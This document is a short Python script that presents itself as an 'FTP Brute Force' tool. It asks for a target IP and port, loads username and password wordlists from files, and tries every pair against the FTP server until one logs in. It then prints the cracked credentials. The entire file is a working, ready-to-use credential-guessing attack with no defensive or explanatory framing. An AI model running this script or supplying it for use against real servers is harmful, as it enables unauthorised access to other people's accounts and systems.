import ftplib
import time

def main():
    print("\nWelcome to FTP Brute Force!\n")

    target = input("Enter the IP address: ")
    ftp = ftplib.FTP()
    port = input("Enter the port: ")

    file_usernames = open(r"...Put the path to your file right here...", "r+") # Select the file with potential logins or usernames.
    file_passwords = open(r"...Put the path to your file right here...", "r+") # Select the file with potential passwords.

    usernames = file_usernames.read().split("\n")
    passwords = file_passwords.read().split("\n")

    print("\nPlease be patient, this may take a while...\n")

    for username in usernames:
        
        for password in passwords:
            time.sleep(0.2)

            try:
                ftp.connect(target, int(port), timeout=4)
                ftp.login(username, password)
                print("[+] Successfully connected!\n"
                      f"\nusername: {username}\n"
                      f"password: {password}\n")
                break

            except Exception as error:
                print("[-] Wrong credentials!\n")

        else:
            continue

        break

    file_usernames.close()
    file_passwords.close()

if __name__ == "__main__":
    main()
